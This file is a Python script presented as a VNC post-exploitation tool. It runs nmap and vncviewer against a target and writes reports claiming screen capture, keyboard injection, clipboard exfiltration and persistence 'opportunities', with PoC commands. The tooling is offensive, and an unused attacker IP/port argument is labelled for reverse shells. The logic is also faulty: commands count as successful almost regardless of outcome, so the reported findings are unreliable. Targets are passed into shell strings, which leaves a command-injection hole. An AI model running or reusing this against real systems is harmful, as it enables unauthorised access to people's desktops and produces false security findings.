#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
POST_EXPLOIT_JSON = "{target}_{service}_post_exploit.json"
POST_EXPLOIT_MD = "{target}_{service}_post_exploit.md"
POST_EXPLOIT_REPORT = "{target}_{service}_post_exploit_report.txt"

def run_command(cmd: List[str], timeout: int = 300, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def test_vnc_connection(target: str, port: str) -> bool:
    """Test VNC connection."""
    cmd = f"nmap -p {port} {target} --script=vnc-info"
    output, success = run_command(cmd, timeout=30, shell=True)
    return success and "VNC" in output

def test_screen_capture(target: str, port: str) -> List[Dict]:
    """Test for screen capture capabilities."""
    results = []
    
    # Test VNC screen capture
    capture_cmd = f"vncviewer -list {target}:{port}"
    output, success = run_command(capture_cmd, timeout=60, shell=True)
    if success and output.strip():
        results.append({
            "type": "VNC Screen Capture",
            "details": "VNC screen capture possible",
            "poc": f"vncviewer {target}:{port}",
            "output": output[:200] + "..." if len(output) > 200 else output
        })
    
    return results

def test_keyboard_injection(target: str, port: str) -> List[Dict]:
    """Test for keyboard injection capabilities."""
    results = []
    
    # Test VNC keyboard injection
    key_cmd = f"vncviewer -passwd /dev/null {target}:{port}"
    output, success = run_command(key_cmd, timeout=60, shell=True)
    if success:
        results.append({
            "type": "VNC Keyboard Injection",
            "details": "VNC keyboard injection possible",
            "poc": f"vncviewer -passwd /dev/null {target}:{port}",
            "output": output[:200] + "..." if len(output) > 200 else output
        })
    
    return results

def test_data_exfiltration(target: str, port: str) -> List[Dict]:
    """Test for data exfiltration through VNC."""
    results = []
    
    # Test for clipboard access
    clipboard_cmd = f"vncviewer -clipboard {target}:{port}"
    output, success = run_command(clipboard_cmd, timeout=60, shell=True)
    if success:
        results.append({
            "type": "VNC Clipboard Access",
            "details": "VNC clipboard access possible",
            "poc": f"vncviewer -clipboard {target}:{port}",
            "output": output[:200] + "..." if len(output) > 200 else output
        })
    
    return results

def test_persistence_mechanisms(target: str, port: str) -> List[Dict]:
    """Test for persistence mechanisms through VNC."""
    results = []
    
    # Test for VNC server configuration
    config_cmd = f"nmap -p {port} {target} --script=vnc-auth"
    output, success = run_command(config_cmd, timeout=60, shell=True)
    if success and "VNC" in output:
        results.append({
            "type": "VNC Server Configuration",
            "details": "VNC server configuration accessible",
            "poc": f"nmap -p {port} {target} --script=vnc-auth",
            "output": output[:200] + "..." if len(output) > 200 else output
        })
    
    return results

def save_post_exploit_report(results: List[Dict], target: str, service: str, port: str) -> None:
    """Save post-exploitation report to JSON and Markdown."""
    json_path = OUTPUT_DIR / POST_EXPLOIT_JSON.format(target=target, service=service)
    md_path = OUTPUT_DIR / POST_EXPLOIT_MD.format(target=target, service=service)
    report_path = OUTPUT_DIR / POST_EXPLOIT_REPORT.format(target=target, service=service)
    
    metadata = {
        "target": target,
        "service": service,
        "port": port,
        "timestamp": time.strftime('%Y-%m-%d %H:%M:%S'),
        "post_exploitation_results": results
    }
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved post-exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# VNC Post-Exploitation Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    for result in results:
        lines.append(f"## {result['type']}\n")
        lines.append(f"- **Details**: {result['details']}\n")
        lines.append(f"- **PoC**: `{result['poc']}`\n")
        lines.append(f"- **Output**: `{result['output']}`\n\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved post-exploit Markdown to {md_path}")
    
    # Save detailed report
    report_lines = [f"VNC Post-Exploitation Report for {target}:{port}\n"]
    report_lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    report_lines.append("=" * 50 + "\n\n")
    
    for result in results:
        report_lines.append(f"Type: {result['type']}\n")
        report_lines.append(f"Details: {result['details']}\n")
        report_lines.append(f"PoC: {result['poc']}\n")
        report_lines.append(f"Output: {result['output']}\n")
        report_lines.append("-" * 30 + "\n\n")
    
    with report_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(report_lines))
    logger.info(f"Saved detailed report to {report_path}")

def post_exploit_target(target: str, service: str, port: str, exploit_data: Dict, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Perform comprehensive post-exploitation on VNC service."""
    results = []
    
    logger.info(f"Starting VNC post-exploitation on {target}:{port}")
    
    # Test VNC connection
    logger.info("Testing VNC connection...")
    if not test_vnc_connection(target, port):
        logger.error("VNC connection failed. Cannot proceed with post-exploitation.")
        return results
    
    # Test screen capture
    logger.info("Testing screen capture...")
    capture_results = test_screen_capture(target, port)
    results.extend(capture_results)
    
    # Test keyboard injection
    logger.info("Testing keyboard injection...")
    key_results = test_keyboard_injection(target, port)
    results.extend(key_results)
    
    # Test data exfiltration
    logger.info("Testing data exfiltration...")
    exfil_results = test_data_exfiltration(target, port)
    results.extend(exfil_results)
    
    # Test persistence mechanisms
    logger.info("Testing persistence mechanisms...")
    persist_results = test_persistence_mechanisms(target, port)
    results.extend(persist_results)
    
    logger.info(f"VNC post-exploitation completed. Found {len(results)} opportunities.")
    return results

def main():
    """Main function to parse arguments and run post-exploitation."""
    parser = argparse.ArgumentParser(description="VNC Post-Exploitation Script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("service", help="Service name (e.g., vnc)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["nmap", "vncviewer", "python3"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Extract port from service name
    port = args.service.split("_")[-1] if "_" in args.service else "5900"
    
    # Create dummy exploit data for testing
    exploit_data = {
        "port": port,
        "exploits": [{"type": "VNC Exploit", "details": "Authentication bypass"}]
    }

    # Run post-exploitation
    logger.info(f"Starting post-exploitation for {args.target}:{port}...")
    results = post_exploit_target(args.target, args.service, port, exploit_data, args.attacker_ip, args.attacker_port)

    # Save results
    save_post_exploit_report(results, args.target, args.service, port)
    logger.info("Post-exploitation complete.")

if __name__ == "__main__":
    main() 